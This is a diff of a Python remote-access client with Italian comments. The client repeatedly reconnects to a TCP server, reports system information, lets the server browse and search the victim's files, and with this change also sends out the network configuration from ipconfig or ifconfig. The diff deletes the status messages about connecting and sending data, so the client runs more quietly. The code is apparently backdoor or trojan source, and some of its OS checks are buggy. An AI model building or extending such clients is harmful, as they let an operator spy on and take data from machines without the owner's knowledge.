@@ -9,6 +9,8 @@ import signal
 from os import system
 import pyautogui
 import traceback
+import subprocess
+
 
 IP = "localhost"
 PORT = 8080  # Porta di Ascolto del TCP
@@ -70,7 +72,7 @@ def clientConnection():
         return "errore"
 
 
-#  manda le informazioni base
+# OK mando informazioni so
 def sendInfo(client):
     mando = 1
     while mando == 1:
@@ -85,6 +87,7 @@ def sendInfo(client):
             raise Exception
 
 
+# OK creazione file con tutti i tipi di tipologia
 def filespath(tipologia, client):
     time.sleep(4)
 
@@ -133,7 +136,7 @@ def filespath(tipologia, client):
     except Exception:
         raise Exception
 
-#cerco tutti i file con estensione indicata in un certo path
+# OK cerco tutti i file con estensione indicata in un certo path
 def find(comando, client):
     time.sleep(4)
     counter_punti=0
@@ -180,6 +183,7 @@ def find(comando, client):
         raise Exception
 
 
+# OK regExpr find
 def regexcheck_find(comando):
     windows_regex='^find \.[a-z]{1,4} (\.(\\[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\\[a-zA-Z0-9, ,\_,\-]+)+)'
     unix_regex='^find \.[a-z]{1,4} (\.(\/[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\/[a-zA-Z0-9, ,\_,\-]+)+)'
@@ -190,6 +194,7 @@ def regexcheck_find(comando):
         return re.match(unix_regex,comando)
 
 
+# OK regExpr cd
 def regexcheck_cd(comando):
     windows_regex = '^cd ([a-zA-Z0-9, ,\-,\_]+)|^cd (\\[a-zA-Z0-9, ,\-,\_]+)+|^cd (\.(\\[a-zA-Z0-9, ,\-,\_]+)+)|^cd \.\.'
     unix_regex = '^cd ([a-zA-Z0-9, ,\-,\_]+)|^cd (\/[a-zA-Z0-9, ,\-,\_]+)+|^cd (\.(\/[a-zA-Z0-9, ,\-,\_]+)+)|^cd \.\.'
@@ -199,6 +204,8 @@ def regexcheck_cd(comando):
     elif platform.system() == "Linux" or "Darwin":
         return re.match(unix_regex,comando)
 
+
+# OK regExpr ls
 def regexcheck_ls(comando):
     windows_regex = '^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\\[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\\[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'
     unix_regex = '^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\/[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\/[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'
@@ -207,6 +214,7 @@ def regexcheck_ls(comando):
        return re.match(windows_regex,comando)
     elif platform.system() == "Darwin" or "Linux":
         return re.match(unix_regex,comando)
+
 
 # funzione di remote control
 def openRemoteControl(client):
@@ -238,12 +246,6 @@ def openRemoteControl(client):
                             data = ''.join(lista)
                             client.send((data).encode(FORMAT))
                             time.sleep(1.5)
-                            # ritorna una lista
-                            #listdir = os.listdir()
-                            # faccio un dump per poterla inoltrare
-                            #data = pickle.dumps(listdir)
-                            #client.send(data)
-                            #time.sleep(1.5)
                         else:
                             comandorisolto = comando.split()
                             path = comandorisolto[1]
@@ -254,10 +256,34 @@ def openRemoteControl(client):
 
                             data = ''.join(lista)
                             client.send((data).encode(FORMAT))
-                            #data = pickle.dumps(listdir)
-                            #client.send(data)
                             time.sleep(1.5)
                 except:
+                    client.send(("[ERROR]").encode(FORMAT))
+
+            elif comando[0:4] == "rete" or comando[0:7] == "network":
+                try:
+                    if platform.system() == "Windows":
+                        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
+                        result = ["### Dati configurazione di rete ###\n"]
+                        for item in data:
+                            result.append(item)
+
+                        result = ''.join(result)
+                        client.send(((result)).encode())
+                        time.sleep(1.5)
+
+                    elif platform.system() == "Darwin" or "Linux":
+                        data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
+                        result = ["### Dati configurazione di rete ###\n"]
+                        for item in data:
+                            result.append(item)
+
+                        result = ''.join(result)
+                        client.send(((result)).encode())
+                        time.sleep(1.5)
+
+                except Exception:
+                    traceback.print_exc()
                     client.send(("[ERROR]").encode(FORMAT))
 
             elif comando == "pwd":
@@ -355,7 +381,6 @@ def main():
         if client == "errore":
             raise Exception
         else:
-            #print(f"[SENDING] Invio informazioni sul mio sistema al server\n")
             time.sleep(5)
             try:
                 sendInfo(client)
@@ -379,7 +404,6 @@ def main():
 
     except Exception as e:
         if e.__class__.__name__ == "ConnectionResetError":
-            #print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
             raise e
         else:
             raise e
@@ -394,8 +418,6 @@ if __name__ == "__main__":
 
     while True:
         try:
-            #print(f"[CONNECTION SEARCH] Sto cercando una connessione\n")
             main()
         except:
-            #print(f"[RECONNECTION] Cerco un server a cui connettermi\n")
             time.sleep(5)
